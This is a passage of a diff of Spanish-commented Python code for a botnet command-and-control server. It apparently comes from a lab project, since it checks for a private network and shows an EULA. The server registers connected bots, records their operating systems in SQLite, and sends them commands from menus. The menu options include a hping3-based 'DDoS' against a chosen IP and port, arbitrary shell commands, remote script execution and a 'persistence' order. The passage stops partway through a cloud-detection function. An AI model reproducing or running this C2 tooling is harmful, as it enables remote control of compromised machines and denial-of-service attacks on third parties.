{addr}\")\r\n-\r\n-        # Recibir identificador 煤nico\r\n-        identificador = conn.recv(1024).decode(\"utf-8\").strip()\r\n-        logging.info(f\"Identificador 煤nico recibido: {identificador}\")\r\n-\r\n-        # Detectar sistema operativo\r\n-        try:\r\n-            conn.send(\"detect_os\".encode(\"utf-8\"))\r\n-            os_info = conn.recv(1024).decode(\"utf-8\").strip().lower()\r\n-            os = \"windows\" if \"windows\" in os_info else \"linux\"\r\n-            sistemas_operativos[conn] = os\r\n-            print(f\"Bot {bot_id} identificado como {os.capitalize()}\")\r\n-        except Exception as e:\r\n-            print(f\"Error al detectar OS de {addr}: {e}\")\r\n-            os = \"desconocido\"\r\n-\r\n-        agregar_o_actualizar_bot_en_db(config, identificador, ip, hostname, os)\r\n-\r\n-        while True:\r\n-            try:\r\n-                data = conn.recv(4096).decode(\"utf-8\", errors=\"ignore\").strip()\r\n-                if not data:\r\n-                    continue\r\n-\r\n-                # Guardar la respuesta en el diccionario sin imprimirla\r\n-                respuestas_bots[bot_id] = data\r\n-                actualizar_bot_en_db(config, ip)\r\n-                agregar_respuesta_en_db(config, bot_id, data)\r\n-\r\n-            except socket.timeout:\r\n-                print(f\"Tiempo de espera agotado con {addr}.\")\r\n-            except Exception as e:\r\n-                print(f\"Error con {addr}: {e}\")\r\n-                break\r\n-\r\n-        # Manejo de desconexi贸n\r\n-        conn.close()\r\n-        logging.info(f\"Bot {bot_id} desconectado\")\r\n-        print(f\"Bot {bot_id} desconectado\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al manejar el bot {bot_id}: {e}\")\r\n-    finally:\r\n-        conn.close()\r\n-        logging.info(f\"Bot {bot_id} desconectado\")\r\n-        print(f\"Bot {bot_id} desconectado\")\r\n-\r\n-def servidor_CnC(HOST, PORT):\r\n-    global server_running\r\n-    \"\"\"\r\n-    Inicia el servidor de Comando y Control (CnC). Crea un socket, lo asocia\r\n-    a la IP y el puerto especificados y lo pone en escucha. Luego, crea un hilo\r\n-    para aceptar conexiones y entra en un bucle para mostrar un men煤 principal\r\n-    que permite al usuario interactuar con los bots conectados.\r\n-\r\n-    :return: None\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(f\"Iniciando servidor CnC en {HOST}:{PORT}\")\r\n-        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Crear el socket\r\n-        server.bind((HOST, PORT)) # Asociar el socket a la IP y el puerto\r\n-        server.listen(5) # Escuchar conexiones\r\n-        print(f\"Escuchando en {HOST}:{PORT}...\") # Imprimir que el servidor esta escuchando\r\n-        \r\n-        threading.Thread(target=aceptar_conexiones, args=(server,)).start() # Crear un hilo para aceptar conexiones\r\n-\r\n-        while server_running:\r\n-            print(\"\\nMen煤 Principal:\")\r\n-            print(\"1. Listar bots conectados\")\r\n-            print(\"2. Enviar comandos\")\r\n-            print(\"3. Cerrar conexi贸n con un bot\")\r\n-            print(\"4. Salir\")\r\n-            opcion = input(\"Seleccione una opci贸n: \")\r\n-\r\n-            if opcion == \"1\":\r\n-                listar_bots()\r\n-            elif opcion == \"2\":\r\n-                menu_comandos()\r\n-            elif opcion == \"3\":\r\n-                cerrar_conexion_bots()\r\n-            elif opcion == \"4\":\r\n-                logging.info(\"Servidor CnC detenido\")\r\n-                print(\"Saliendo de la consola...\")\r\n-                server_running = False\r\n-                server.close()\r\n-                break\r\n-            else:\r\n-                print(\"Opci贸n no v谩lida. Intente de nuevo.\")\r\n-        \r\n-        # Esperar a que todos los hilos de bots terminen\r\n-        for bot in bots:\r\n-            bot.close()\r\n-        for thread in threading.enumerate():\r\n-            if thread is not threading.current_thread():\r\n-                thread.join()\r\n-    except Exception as e:\r\n-        logging.error(f\"Error en el servidor CnC: {e}\")\r\n-\r\n-def aceptar_conexiones(server):\r\n-    global server_running\r\n-    \"\"\"\r\n-    Acepta conexiones de bots y las asigna a un hilo para manejarlas.\r\n-\r\n-    Este hilo infinito espera conexiones de bots y las asigna a la lista de\r\n-    bots conectados. A cada bot se le asigna un ID 煤nico y se crea un hilo\r\n-    para manejar la conexi贸n. El hilo maneja_bot se encarga de recibir los\r\n-    mensajes del bot, detectar el sistema operativo y ejecutar comandos\r\n-    enviados por el usuario.\r\n-\r\n-    :param server: El socket del servidor C&C.\r\n-    :type server: socket.socket\r\n-    \"\"\"\r\n-    try:\r\n         logging.info(\"Aceptando conexiones de bots\")\r\n         bot_id = 1 # Contador de bots\r\n         while server_running:\r\n             try:\r\n                 conn, addr = server.accept() # Aceptar la conexi贸n\r\n                 bots.append(conn) # Agregar el bot a la lista\r\n                 bot_ids[conn] = bot_id # Asignar el ID del bot\r\n-                threading.Thread(target=manejar_bot, args=(conn, addr, bot_id)).start() # Crear un hilo para manejar la conexi贸n\r\n+                threading.Thread(target=manejar_bot, args=(conn, addr, bot_id, config)).start() # Crear un hilo para manejar la conexi贸n\r\n                 bot_id += 1 # Incrementar el contador de bots\r\n             except OSError:\r\n                 if not server_running:\r\n                     break\r\n@@ -1291,1619 +383,21 @@\n                     raise\r\n     except Exception as e:\r\n         logging.error(f\"Error al aceptar conexiones: {e}\")\r\n \r\n-def listar_bots():\r\n-    \"\"\"\r\n-    Muestra la lista de bots conectados al servidor C&C, incluyendo\r\n-    su identificador, sistema operativo y direcci贸n IP y puerto de\r\n-    conexi贸n.\r\n-    \r\n-    :return: None\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(\"Listando bots conectados\")\r\n-        if bots:\r\n-            print(\"\\nBots conectados:\")\r\n-            for bot in bots: # Recorrer la lista de bots\r\n-                so = sistemas_operativos.get(bot, \"Desconocido\") # Obtener el SO del bot\r\n-                print(f\"Bot {bot_ids[bot]} ({so.capitalize()}): {bot.getpeername()}\") # Imprimir el bot\r\n-        else:\r\n-            print(\"No hay bots conectados.\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al listar bots: {e}\")\r\n-\r\n-def menu_comandos():\r\n-    \r\n-    \"\"\"\r\n-    Muestra el men煤 de comandos disponibles para ejecutar en los bots\r\n-    conectados y permite al usuario seleccionar una orden para ejecutar en\r\n-    todos los bots o en algunos seleccionados manualmente.\r\n-\r\n-    :return: None\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(\"Mostrando men煤 de comandos\")\r\n-        if not bots:\r\n-            print(\"No hay bots conectados.\")\r\n-            return\r\n-\r\n-        print(\"\\nSeleccione el tipo de comandos:\")\r\n-        print(\"1. Comandos b谩sicos\")\r\n-        print(\"2. Comandos avanzados\")\r\n-        tipo_comando = input(\"Ingrese su opci贸n: \")\r\n-\r\n-        if tipo_comando == \"1\":\r\n-            print(\"\\nComandos b谩sicos disponibles:\")\r\n-            print(\"1. Obtener informaci贸n del sistema\")\r\n-            print(\"2. Consultar conexiones de red\")\r\n-            print(\"3. Ver procesos en ejecuci贸n\")\r\n-            print(\"4. Listar archivos en el directorio actual\")\r\n-            print(\"5. Obtener la IP p煤blica\")\r\n-            orden = input(\"Seleccione una orden: \")\r\n-            comando_windows = \"\"\r\n-            comando_linux = \"\"\r\n-\r\n-            if orden == \"1\":\r\n-                comando_windows = \"systeminfo\"\r\n-                comando_linux = \"uname -a && lsb_release -a\"\r\n-            elif orden == \"2\":\r\n-                comando_windows = \"netstat -ano\"\r\n-                comando_linux = \"netstat -tunapl\"\r\n-            elif orden == \"3\":\r\n-                comando_windows = \"tasklist\"\r\n-                comando_linux = \"ps aux\"\r\n-            elif orden == \"4\":\r\n-                comando_windows = \"dir\"\r\n-                comando_linux = \"ls -lah\"\r\n-            elif orden == \"5\":\r\n-                comando_windows = \"curl ifconfig.me\"\r\n-                comando_linux = \"curl ifconfig.me\"\r\n-            else:\r\n-                print(\"Opci贸n no v谩lida.\")\r\n-                return\r\n-\r\n-            enviar_comando(comando_windows, comando_linux)\r\n-\r\n-        elif tipo_comando == \"2\":\r\n-            print(\"\\nComandos avanzados disponibles:\")\r\n-            print(\"1. Simular ataque DDoS\")\r\n-            print(\"2. Detener simulaci贸n de DDoS\")\r\n-            print(\"3. Ejecutar un comando personalizado\")\r\n-            print(\"4. Ejecutar un script remoto\")\r\n-            print(\"5. Intentar asegurar la persistencia\")\r\n-            orden = input(\"Seleccione una orden: \")\r\n-            comando_windows = \"\"\r\n-            comando_linux = \"\"\r\n-\r\n-            if orden == \"1\":\r\n-                objetivo = input(\"Ingrese la direcci贸n IP del objetivo: \")\r\n-                puerto = input(\"Ingrese el puerto del objetivo: \")\r\n-                protocolo = input(\"Ingrese el protocolo (TCP/UDP): \").upper()\r\n-                if protocolo not in [\"TCP\", \"UDP\"]:\r\n-                    print(\"Protocolo no v谩lido.\")\r\n-                    return\r\n-                comando_windows = f\"powershell -Command \\\"for ($i=0; $i -lt 10; $i++) {{Start-Sleep -Seconds 10; Test-NetConnection -ComputerName {objetivo} -Port {puerto} -InformationLevel 'Detailed'}}\\\"\"\r\n-                comando_linux = f\"for i in {{1..10}}; do hping3 -S -p {puerto} -c 1 {objetivo}; sleep 10; done\"\r\n-                enviar_comando(comando_windows, comando_linux, \"ddos_start\")\r\n-            elif orden == \"2\":\r\n-                comando_windows = \"stop_ddos\"\r\n-                comando_linux = \"stop_ddos\"\r\n-                enviar_comando(comando_windows, comando_linux, \"ddos_stop\")\r\n-            elif orden == \"3\":\r\n-                comando_windows = input(\"Ingrese el comando personalizado para Windows: \")\r\n-                comando_linux = input(\"Ingrese el comando personalizado para Linux: \")\r\n-                enviar_comando(comando_windows, comando_linux)\r\n-            elif orden == \"4\":\r\n-                print(\"Seleccione el tipo de script:\")\r\n-                print(\"1. Python\")\r\n-                print(\"2. Bash\")\r\n-                print(\"3. Otro (especificar)\")\r\n-                \r\n-                tipo = input(\"Ingrese la opci贸n: \")\r\n-\r\n-                if tipo == \"1\":\r\n-                    extension = \"py\"\r\n-                    interprete_linux = \"python3 -c\"\r\n-                    interprete_windows = \"python -c\"\r\n-                elif tipo == \"2\":\r\n-                    extension = \"sh\"\r\n-                    interprete_linux = \"bash -c\"\r\n-                    interprete_windows = \"powershell -Command\"\r\n-                elif tipo == \"3\":\r\n-                    extension = input(\"Ingrese la extensi贸n del script (ejemplo: ps1, rb, pl): \")\r\n-                    interprete_linux = input(\"Ingrese el comando para ejecutarlo en Linux: \")\r\n-                    interprete_windows = input(\"Ingrese el comando para ejecutarlo en Windows: \")\r\n-                else:\r\n-                    print(\"Opci贸n inv谩lida.\")\r\n-                    return\r\n-\r\n-                print(\"\\n驴C贸mo desea proporcionar el script?\")\r\n-                print(\"1. Escribirlo aqu铆\")\r\n-                print(\"2. Proporcionar la ruta de un archivo\")\r\n-                \r\n-                metodo = input(\"Ingrese la opci贸n: \")\r\n-\r\n-                if metodo == \"1\":\r\n-                    print(f\"Escriba su script en {extension}. Finalice con 'EOF' en una l铆nea nueva:\")\r\n-                    lineas = []\r\n-                    while True:\r\n-                        try:\r\n-                            linea = input()\r\n-                            if linea.strip().upper() == \"EOF\":  # Detectar EOF\r\n-                                break\r\n-                            lineas.append(linea)\r\n-                        except KeyboardInterrupt:  # Capturar Ctrl+C para salir\r\n-                            print(\"\\nEntrada cancelada.\")\r\n-                            return\r\n-                    script = \"\\n\".join(lineas)  # Unir l铆neas en una sola cadena\r\n-                elif metodo == \"2\":\r\n-                    ruta = input(\"Ingrese la ruta del archivo: \")\r\n-                    try:\r\n-                        with open(ruta, \"r\", encoding=\"utf-8\") as archivo:\r\n-                            script = archivo.read()\r\n-                    except Exception as e:\r\n-                        print(f\"Error al leer el archivo: {e}\")\r\n-                        return\r\n-                else:\r\n-                    print(\"Opci贸n inv谩lida.\")\r\n-                    return\r\n-\r\n-                # Reemplazar comillas para evitar problemas con la ejecuci贸n remota\r\n-                script = script.replace('\"', r'\\\"').replace(\"'\", r\"\\'\")\r\n-\r\n-                comando_windows = f'{interprete_windows} \"{script}\"'\r\n-                comando_linux = f\"{interprete_linux} '{script}'\"\r\n-\r\n-                enviar_comando(comando_windows, comando_linux)\r\n-            elif orden == \"5\":\r\n-                print(\"\\nIntentando asegurar la persistencia en los bots seleccionados...\")\r\n-                comando_windows = \"persistencia\"\r\n-                comando_linux = \"persistencia\"\r\n-                enviar_comando(comando_windows, comando_linux)\r\n-            else:\r\n-                print(\"Opci贸n no v谩lida.\")\r\n-                return\r\n-        else:\r\n-            print(\"Opci贸n no v谩lida.\")\r\n-            return\r\n-    except Exception as e:\r\n-        logging.error(f\"Error en el men煤 de comandos: {e}\")\r\n-\r\n-def enviar_comando(comando_windows, comando_linux, tipo_comando=None):\r\n-    \r\n-    \"\"\"\r\n-    Env铆a un comando a un conjunto de bots seleccionados.\r\n-\r\n-    :param comando_windows: El comando a enviar a los bots Windows.\r\n-    :type comando_windows: str\r\n-    :param comando_linux: El comando a enviar a los bots Linux.\r\n-    :type comando_linux: str\r\n-    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n-    :type tipo_comando: str\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(\"Enviando comando a los bots seleccionados\")\r\n-        if not bots:\r\n-            print(\"No hay bots conectados.\")\r\n-            return\r\n-\r\n-        print(\"\\nSeleccione a qu茅 bots enviar el comando:\")\r\n-        print(\"1. Todos los bots\")\r\n-        print(\"2. Solo bots Windows\")\r\n-        print(\"3. Solo bots Linux\")\r\n-        print(\"4. Un bot espec铆fico\")\r\n-        print(\"5. Lista de bots espec铆ficos\")\r\n-\r\n-        seleccion = input(\"Ingrese su opci贸n: \")\r\n-        bots_seleccionados = []\r\n-\r\n-        if seleccion == \"1\":\r\n-            bots_seleccionados = bots\r\n-        elif seleccion == \"2\":\r\n-            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"windows\"]\r\n-        elif seleccion == \"3\":\r\n-            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"linux\"]\r\n-        elif seleccion == \"4\":\r\n-            listar_bots()\r\n-            try:\r\n-                bot_id = int(input(\"Ingrese el ID del bot: \"))\r\n-                bot = next((b for b in bots if bot_ids.get(b) == bot_id), None)\r\n-                if bot:\r\n-                    bots_seleccionados.append(bot)\r\n-                else:\r\n-                    print(\"ID de bot no v谩lido.\")\r\n-                    return\r\n-            except ValueError:\r\n-                print(\"ID inv谩lido. Debe ingresar un n煤mero.\")\r\n-                return\r\n-        elif seleccion == \"5\":\r\n-            listar_bots()\r\n-            try:\r\n-                bot_ids_seleccionados = [int(id.strip()) for id in input(\"Ingrese los IDs de los bots separados por comas: \").split(\",\") if id.strip().isdigit()]\r\n-                bots_seleccionados = [b for b in bots if bot_ids.get(b) in bot_ids_seleccionados]\r\n-                if not bots_seleccionados:\r\n-                    print(\"No se encontraron bots con los IDs proporcionados.\")\r\n-                    return\r\n-            except ValueError:\r\n-                print(\"Entrada inv谩lida. Debe ingresar n煤meros separados por comas.\")\r\n-                return\r\n-        else:\r\n-            print(\"Opci贸n no v谩lida.\")\r\n-            return\r\n-\r\n-        respuestas = {}\r\n-\r\n-        for bot in bots_seleccionados:\r\n-            respuestas[bot] = enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando)\r\n-\r\n-        print(\"\\n--- Respuestas de los bots ---\\n\")\r\n-        for bot, respuesta in respuestas.items():\r\n-            bot_info = f\"Bot {bot_ids.get(bot, 'Desconocido')} ({sistemas_operativos.get(bot, 'Desconocido').capitalize()})\"\r\n-            print(f\"[] {bot_info}: {respuesta}\")\r\n-\r\n-        print(\"\\n--- Volviendo al men煤 principal ---\\n\")\r\n-        time.sleep(2)\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al enviar comando: {e}\")\r\n-\r\n-def enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando=None):\r\n-    \r\n-    \"\"\"\r\n-    Env铆a un comando a un bot espec铆fico basado en su sistema operativo.\r\n-\r\n-    Determina el sistema operativo del bot y env铆a el comando adecuado \r\n-    para Windows o Linux. Espera una respuesta del bot por un tiempo \r\n-    m谩ximo definido y devuelve la respuesta si se recibe. Maneja la \r\n-    desconexi贸n del bot si ocurre durante la comunicaci贸n.\r\n-\r\n-    :param bot: El socket del bot al que se enviar谩 el comando.\r\n-    :param comando_windows: El comando a ejecutar si el bot es Windows.\r\n-    :param comando_linux: El comando a ejecutar si el bot es Linux.\r\n-    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n-    :type tipo_comando: str\r\n-    :return: La respuesta del bot o un mensaje de error si no se recibe \r\n-             respuesta o si el bot se desconecta.\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(f\"Enviando comando al bot {bot_ids.get(bot, 'Desconocido')}\")\r\n-        so = sistemas_operativos.get(bot, \"desconocido\")\r\n-        comando = comando_windows if so == \"windows\" else comando_linux\r\n-        bot_id = bot_ids.get(bot, \"Desconocido\")\r\n-\r\n-        try:\r\n-            bot.send(comando.encode('utf-8'))\r\n-            print(f\"\\n[] Orden enviada a bot {bot_id} ({so.capitalize()})\\n\")\r\n-\r\n-            # Esperar hasta que `manejar_bot()` almacene la respuesta\r\n-            tiempo_maximo = 5  # Segundos\r\n-            tiempo_inicial = time.time()\r\n-\r\n-            while time.time() - tiempo_inicial < tiempo_maximo:\r\n-                if bot_id in respuestas_bots:\r\n-                    respuesta = respuestas_bots.pop(bot_id)  # Tomar y eliminar la respuesta\r\n-                    if tipo_comando == \"ddos_start\":\r\n-                        ddos_status[bot_id] = \"running\"\r\n-                    elif tipo_comando == \"ddos_stop\":\r\n-                        ddos_status[bot_id] = \"stopped\"\r\n-                    print(f\"\\n--- Respuesta del Bot {bot_id} ---\\n{respuesta}\\n\")\r\n-                    return respuesta if respuesta else \"[INFO] Comando ejecutado sin salida\"\r\n-                time.sleep(0.5)  # Esperar 0.5 segundos antes de verificar nuevamente\r\n-\r\n-            return \"[ERROR] No hubo respuesta del bot (Timeout)\"\r\n-\r\n-        except (socket.error, BrokenPipeError):\r\n-            print(f\"[] Bot {bot_id} desconectado.\")\r\n-            if bot in bots:\r\n-                bots.remove(bot)\r\n-            if bot in bot_ids:\r\n-                del bot_ids[bot]\r\n-            if bot in sistemas_operativos:\r\n-                del sistemas_operativos[bot]\r\n-            return \"[ERROR] El bot se ha desconectado.\"\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al enviar comando al bot {bot_ids.get(bot, 'Desconocido')}: {e}\")\r\n-\r\n-def cerrar_conexion_bots():\r\n-    \r\n-    \"\"\"\r\n-    Cierra la conexi贸n con un bot seleccionado por el usuario.\r\n-    \r\n-    El usuario puede seleccionar a los bots a los que quiere cerrar la conexi贸n\r\n-    mediante un ID o bien escribir \"todos\" para cerrar la conexi贸n con todos\r\n-    los bots conectados.\r\n-    \r\n-    :return: None\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(\"Cerrando conexi贸n con los bots seleccionados\")\r\n-        if not bots:\r\n-            print(\"No hay bots conectados.\")\r\n-            return\r\n-\r\n-        listar_bots()\r\n-        \r\n-        try:\r\n-            bot_id = int(input(\"Seleccione el ID del bot cuya conexi贸n quiere cerrar: \")) # Obtener el ID del bot seleccionado\r\n-        except ValueError:\r\n-            print(\"ID inv谩lido. Debe ingresar un n煤mero.\")\r\n-            return\r\n-\r\n-        bot = next((b for b in bots if bot_ids.get(b) == bot_id), None) # Buscar el bot con el ID correspondiente\r\n-        \r\n-        if not bot: # Si no se encuentra el bot\r\n-            print(f\"ID de bot {bot_id} no v谩lido.\") # Imprimir un mensaje de error\r\n-            return\r\n-\r\n-        try:\r\n-            bot.close() # Cerrar la conexi贸n\r\n-            print(f\"Conexi贸n con el bot {bot_id} cerrada.\") # Imprimir un mensaje de confirmaci贸n\r\n-        except Exception as e:\r\n-            print(f\"Error al cerrar la conexi贸n con el bot {bot_id}: {e}\")\r\n-\r\n-        if bot in bots:\r\n-            bots.remove(bot) # Eliminar el bot de la lista\r\n-\r\n-        if bot in bot_ids:\r\n-            del bot_ids[bot] # Eliminar el ID del bot\r\n-\r\n-        if bot in sistemas_operativos:\r\n-            del sistemas_operativos[bot] # Eliminar el SO del bot\r\n-\r\n-        print(f\"Bot {bot_id} eliminado correctamente del sistema.\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al cerrar conexi贸n con los bots: {e}\")\r\n-\r\n-def cargar_configuracion():\r\n-    \r\n-    \"\"\"\r\n-    Carga la configuraci贸n del servidor desde un archivo \"config.ini\" ubicado\r\n-    en el directorio \"config\" del proyecto.\r\n-\r\n-    La configuraci贸n se almacena en un objeto con las siguientes claves:\r\n-        * BASE_DIR: Directorio base del proyecto.\r\n-        * HOST: Direcci贸n IP del servidor.\r\n-        * PORT: Puerto de escucha del servidor.\r\n-        * MAX_CONNECTIONS: N煤mero m谩ximo de conexiones permitidas.\r\n-        * DB_PATH: Ruta del archivo de la base de datos.\r\n-        * SECRET_KEY: Clave secreta para la autenticaci贸n.\r\n-        * HASH_ALGORITHM: Algoritmo de hash para la autenticaci贸n.\r\n-        * LOG_LEVEL: Nivel de log (DEBUG, INFO, WARNING, ERROR, CRITICAL).\r\n-        * SERVER_LOG_FILE: Ruta del archivo de log.\r\n-\r\n-    Si no se encuentra el archivo de configuraci贸n o hay un error al leerlo,\r\n-    se muestra un mensaje de error y se sale del programa con un estado de\r\n-    error.\r\n-\r\n-    :return: Un objeto con la configuraci贸n cargada.\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(\"Cargando configuraci贸n del servidor\")\r\n-        BASE_DIR = os.path.dirname(os.path.abspath(__file__))\r\n-        CONFIG_DIR = os.path.join(BASE_DIR, \"..\", \"config\")\r\n-        CONFIG_PATH = os.path.join(CONFIG_DIR, \"config.ini\")\r\n-\r\n-        if not os.path.exists(CONFIG_PATH):\r\n-            raise FileNotFoundError(f\"[ERROR] No se encontr贸 el archivo de configuraci贸n: {CONFIG_PATH}\")\r\n-\r\n-        config = configparser.ConfigParser()\r\n-        config.read(CONFIG_PATH)\r\n-\r\n-        return {\r\n-            \"BASE_DIR\": BASE_DIR,\r\n-            \"HOST\": config.get(\"NETWORK\", \"HOST\"),\r\n-            \"PORT\": config.getint(\"NETWORK\", \"PORT\"),\r\n-            \"MAX_CONNECTIONS\": config.getint(\"NETWORK\", \"MAX_CONNECTIONS\"),\r\n-            \"DB_PATH\": os.path.join(BASE_DIR, config.get(\"DATABASE\", \"DB_PATH\")),\r\n-            \"SECRET_KEY\": config.get(\"SECURITY\", \"SECRET_KEY\"),\r\n-            \"HASH_ALGORITHM\": config.get(\"SECURITY\", \"HASH_ALGORITHM\"),\r\n-            \"LOG_LEVEL\": config.get(\"LOGGING\", \"LOG_LEVEL\"),\r\n-            \"SERVER_LOG_FILE\": os.path.join(BASE_DIR, \"..\", config.get(\"LOGGING\", \"LOG_DIR\"), config.get(\"LOGGING\", \"SERVER_LOG_FILE\"))\r\n-        }\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al cargar la configuraci贸n: {e}\")\r\n-        exit(1)\r\n-\r\n-def iniciar_servidor():\r\n-    \"\"\"\r\n-    Inicializa el servidor de Comando y Control (C2) verificando primero\r\n-    que no se ejecute en una red privada y mostrando un aviso de EULA.\r\n-\r\n-    Luego, inicializa la base de datos, configura el sistema de logging y\r\n-    lanza el servidor de C2.\r\n-\r\n-    :return: None\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(\"Iniciando servidor de Comando y Control (C2)\")\r\n-        config = cargar_configuracion()\r\n-        configurar_logging(config)  # Pasar el objeto de configuraci贸n en lugar de la cadena\r\n-        if not esRedPrivada(config[\"HOST\"]):\r\n-            input(\"[ERROR] No puedes ejecutar este servidor fuera de una red privada. Presione ENTER para cerrar.\")\r\n-            sys.exit(1)\r\n-        verificar_eula(\"servidor\")\r\n-        init_db(config[\"DB_PATH\"])\r\n-        servidor_CnC(config[\"HOST\"], config[\"PORT\"])\r\n-        logging.info(\"Servidor de Comando y Control (C2) iniciado correctamente\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al iniciar el servidor: {e}\")\r\n-\r\n-if __name__ == \"__main__\":\r\n-    try:\r\n-        iniciar_servidor()\r\n-    except Exception as e:\r\n-        logging.error(f\"Error en la ejecuci贸n principal: {e}\")\n-import logging\r\n-import socket\r\n-import sys\r\n-import threading\r\n-import time\r\n-import os\r\n-import ipaddress\r\n-import requests\r\n-import sqlite3\r\n-import configparser\r\n-from datetime import datetime\r\n-\r\n-bots = [] # List de bots\r\n-bot_ids = {} # Diccinario con los IDS de los bots\r\n-sistemas_operativos = {}  # Diccionario para almacenar el SO de cada bot\r\n-respuestas_bots = {}  # Diccionario para almacenar las 煤ltimas respuestas de los bots\r\n-ddos_status = {}  # Diccionario para almacenar el estado del DDoS en cada bot\r\n-server_running = True  # Variable para controlar el estado del servidor\r\n-\r\n-def configurar_logging(config):\r\n-    \"\"\"\r\n-    Configura el sistema de logging del servidor.\r\n-\r\n-    El nivel de log se establece seg煤n la clave \"LOG_LEVEL\" en el objeto de configuraci贸n.\r\n-    El nivel de log puede ser \"DEBUG\", \"INFO\", \"WARNING\", \"ERROR\" o \"CRITICAL\".\r\n-    Si no se especifica un nivel de log, se establece en \"INFO\" por defecto.\r\n-\r\n-    La ruta del archivo de log se establece seg煤n la clave \"LOG_FILE\" en el objeto de configuraci贸n.\r\n-    La ruta se crea si no existe.\r\n-\r\n-    El formato de los mensajes de log se establece en \"%(asctime)s - %(levelname)s - %(message)s\".\r\n-\r\n-    Los mensajes de log se escriben en el archivo de log y en la consola.\r\n-\r\n-    :param config: Un objeto con la configuraci贸n del servidor.\r\n-    \"\"\"\r\n-    try:\r\n-        log_level = config[\"LOG_LEVEL\"].upper()\r\n-        log_file = config[\"SERVER_LOG_FILE\"]\r\n-\r\n-        log_levels = {\r\n-            \"DEBUG\": logging.DEBUG,\r\n-            \"INFO\": logging.INFO,\r\n-            \"WARNING\": logging.WARNING,\r\n-            \"ERROR\": logging.ERROR,\r\n-            \"CRITICAL\": logging.CRITICAL\r\n-        }\r\n-        log_level = log_levels.get(log_level, logging.INFO)\r\n-\r\n-        os.makedirs(os.path.dirname(log_file), exist_ok=True)\r\n-\r\n-        logging.basicConfig(\r\n-            level=log_level,\r\n-            format=\"%(asctime)s - %(levelname)s - %(message)s\",\r\n-            handlers=[\r\n-                logging.FileHandler(log_file, encoding=\"utf-8\"),\r\n-                logging.StreamHandler(sys.stdout)\r\n-            ]\r\n-        )\r\n-\r\n-        logging.info(\"Sistema de logging configurado correctamente.\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al configurar el logging: {e}\")\r\n-\r\n-# Inicializar la base de datos\r\n-def init_db(DB_PATH):\r\n-    \"\"\"\r\n-    Inicializa la base de datos SQLite para almacenar informaci贸n sobre los bots y sus respuestas.\r\n-\r\n-    Crea la carpeta y el archivo de la base de datos si no existe,\r\n-    y crea las tablas \"bots\" y \"respuestas\" si no existen.\r\n-\r\n-    :param DB_PATH: La ruta del archivo de la base de datos.\r\n-    :type DB_PATH: str\r\n-    \"\"\"\r\n-    try:\r\n-        db_dir = os.path.dirname(DB_PATH)\r\n-        if not os.path.exists(db_dir):\r\n-            os.makedirs(db_dir)  # Crear carpeta si no existe\r\n-\r\n-        conn = sqlite3.connect(DB_PATH)\r\n-        cursor = conn.cursor()\r\n-\r\n-        cursor.execute('''CREATE TABLE IF NOT EXISTS bots (\r\n-                            id INTEGER PRIMARY KEY AUTOINCREMENT,\r\n-                            identificador TEXT UNIQUE,\r\n-                            ip TEXT,\r\n-                            hostname TEXT,\r\n-                            os TEXT,\r\n-                            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP\r\n-                        )''')\r\n-\r\n-        cursor.execute('''CREATE TABLE IF NOT EXISTS respuestas (\r\n-                            id INTEGER PRIMARY KEY AUTOINCREMENT,\r\n-                            bot_id INTEGER,\r\n-                            respuesta TEXT,\r\n-                            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\r\n-                            FOREIGN KEY (bot_id) REFERENCES bots (id)\r\n-                        )''')\r\n-\r\n-        conn.commit()\r\n-        conn.close()\r\n-        logging.info(\"Base de datos inicializada correctamente.\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al inicializar la base de datos: {e}\")\r\n-\r\n-def agregar_respuesta_en_db(config, bot_id, respuesta):\r\n-    \"\"\"\r\n-    Agrega una respuesta de un bot a la base de datos SQLite.\r\n-\r\n-    :param config: Un objeto con la configuraci贸n del servidor.\r\n-    :param bot_id: El ID del bot que envi贸 la respuesta.\r\n-    :type bot_id: int\r\n-    :param respuesta: La respuesta del bot.\r\n-    :type respuesta: str\r\n-    \"\"\"\r\n-    try:\r\n-        conn = sqlite3.connect(config[\"DB_PATH\"], detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)\r\n-        cursor = conn.cursor()\r\n-        cursor.execute(\"INSERT INTO respuestas (bot_id, respuesta, timestamp) VALUES (?, ?, ?)\", (bot_id, respuesta, datetime.now()))\r\n-        conn.commit()\r\n-        conn.close()\r\n-        logging.info(f\"Respuesta del bot {bot_id} agregada a la base de datos.\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al agregar la respuesta del bot en la base de datos: {e}\")\r\n-\r\n-def detectarEntornoCloud():\r\n-    \r\n-    \"\"\"\r\n-    Detecta si el entorno actual es un entorno de cloud computing.\r\n-\r\n-    Intenta conectarse a los puntos de metadata de AWS y Google Cloud para \r\n-    determinar si el c贸digo se ejecuta en un entorno de nube. Si se logra \r\n-    conectar exitosamente a cualquiera de estos servicios, se asume que el \r\n-    entorno es un entorno de cloud y se devuelve True. En caso contrario, \r\n-    se devuelve False.\r\n-\r\n-    Returns:\r\n-        bool: True si se ejecuta en un entorno de cloud, False en caso contrario.\r\n-    \"\"\"\r\n-    try:\r\n-        try:\r\n-            # AWS Metadata\r\n-            if requests.get(\"http://169.254.169.254/latest/meta-data/\", 